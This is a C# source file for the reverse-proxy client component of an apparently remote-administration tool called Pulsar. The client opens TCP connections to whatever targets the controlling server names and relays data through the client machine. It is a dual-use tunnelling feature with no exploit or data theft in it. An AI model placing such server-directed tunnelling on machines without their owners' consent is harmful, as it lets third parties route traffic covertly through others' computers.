using Pulsar.Common.Messages.Administration.ReverseProxy;
using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace Pulsar.Client.ReverseProxy
{
    public class ReverseProxyClient
    {
        public const int BUFFER_SIZE = 8192;

        public int ConnectionId { get; private set; }
        public Socket Handle { get; private set; }
        public string Target { get; private set; }
        public int Port { get; private set; }
        public Networking.Client Client { get; private set; }
        private byte[] _buffer;
        private bool _disconnectIsSend;
        private bool _disposed;
        private long _sequence;
        private string _listenerSessionId;
        private string _tunnelId;
        private string _originClientId;
        public string ListenerSessionId { get { return _listenerSessionId; } }
        public string TunnelId { get { return _tunnelId; } }

        public ReverseProxyClient(ReverseProxyConnect command, Networking.Client client)
        {
            this.ConnectionId = command.ConnectionId;
            this.Target = command.Target;
            this.Port = command.Port;
            this.Client = client;
            this._listenerSessionId = command.ListenerSessionId;
            this._tunnelId = command.TunnelId;
            this._originClientId = command.OriginClientId;
            this.Handle = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

            //Non-Blocking connect, so there is no need for a extra thread to create
            this.Handle.BeginConnect(command.Target, command.Port, Handle_Connect, null);
        }

        private void Handle_Connect(IAsyncResult ar)
        {
            try
            {
                this.Handle.EndConnect(ar);
            }
            catch { }

            if (this.Handle.Connected)
            {
                try
                {
                    this._buffer = new byte[BUFFER_SIZE];
                    this.Handle.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, AsyncReceive, null);
                }
                catch
                {
                    Client.Send(new ReverseProxyConnectResponse
                    {
                        ConnectionId = ConnectionId,
                        IsConnected = false,
                        LocalAddress = null,
                        LocalPort = 0,
                        HostName = Target,
                        ListenerSessionId = _listenerSessionId,
                        TunnelId = _tunnelId,
                        Sequence = Interlocked.Increment(ref _sequence),
                        Status = Pulsar.Common.Enums.ReverseProxyStatus.Failed,
                        ErrorCode = "REVERSE_PROXY_CONNECT_FAILED",
                        ErrorMessage = "Unable to connect to target."
                    });
                    Disconnect();
                }

                IPEndPoint localEndPoint = (IPEndPoint)this.Handle.LocalEndPoint;
                Client.Send(new ReverseProxyConnectResponse
                {
                    ConnectionId = ConnectionId,
                    IsConnected = true,
                    LocalAddress = localEndPoint.Address.GetAddressBytes(),
                    LocalPort = localEndPoint.Port,
                    HostName = Target,
                    ListenerSessionId = _listenerSessionId,
                    TunnelId = _tunnelId,
                    Sequence = Interlocked.Increment(ref _sequence),
                    Status = Pulsar.Common.Enums.ReverseProxyStatus.Connected
                });
            }
            else
            {
                Client.Send(new ReverseProxyConnectResponse
                {
                    ConnectionId = ConnectionId,
                    IsConnected = false,
                    LocalAddress = null,
                    LocalPort = 0,
                    HostName = Target
                });
            }
        }

        private void AsyncReceive(IAsyncResult ar)
        {
            //Receive here data from e.g. a WebServer

            if (_disposed)
                return;

            try
            {
                int received = Handle.EndReceive(ar);

                if (received <= 0)
                {
                    Disconnect();
                    return;
                }

                byte[] payload = new byte[received];
                Array.Copy(_buffer, payload, received);
                if (!Pulsar.Common.Networking.ReverseProxyValidation.IsValidPayloadLength(payload.Length))
                    throw new InvalidOperationException("Invalid reverse proxy payload length.");

                Client.Send(new ReverseProxyData
                {
                    ConnectionId = ConnectionId,
                    Data = payload,
                    ListenerSessionId = _listenerSessionId,
                    TunnelId = _tunnelId,
                    Sequence = Interlocked.Increment(ref _sequence),
                    OriginClientId = _originClientId
                });
            }
            catch (ObjectDisposedException)
            {
                // Socket was disposed, ignore
                return;
            }
            catch
            {
                Disconnect();
                return;
            }

            if (_disposed)
                return;

            try
            {
                this.Handle.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, AsyncReceive, null);
            }
            catch
            {
                Disconnect();
                return;
            }
        }

        public void Disconnect()
        {
            if (_disposed)
                return;

            _disposed = true;

            if (!_disconnectIsSend)
            {
                _disconnectIsSend = true;
                //send to the Server we've been disconnected
                try
                {
                    Client.Send(new ReverseProxyDisconnect
                    {
                        ConnectionId = ConnectionId,
                        ListenerSessionId = _listenerSessionId,
                        TunnelId = _tunnelId,
                        Sequence = Interlocked.Increment(ref _sequence),
                        OriginClientId = _originClientId,
                        Status = Pulsar.Common.Enums.ReverseProxyStatus.Stopped,
                        Reason = "client_tunnel_closed"
                    });
                }
                catch { }
            }

            try
            {
                Handle.Close();
            }
            catch { }

            Client.RemoveProxyClient(this.ConnectionId);
        }

        public void SendToTargetServer(byte[] data)
        {
            if (_disposed)
                return;

            if (!Pulsar.Common.Networking.ReverseProxyValidation.IsValidPayloadLength(data?.Length ?? 0))
                return;

            try
            {
                Handle.Send(data);
            }
            catch { Disconnect(); }
        }
    }
}
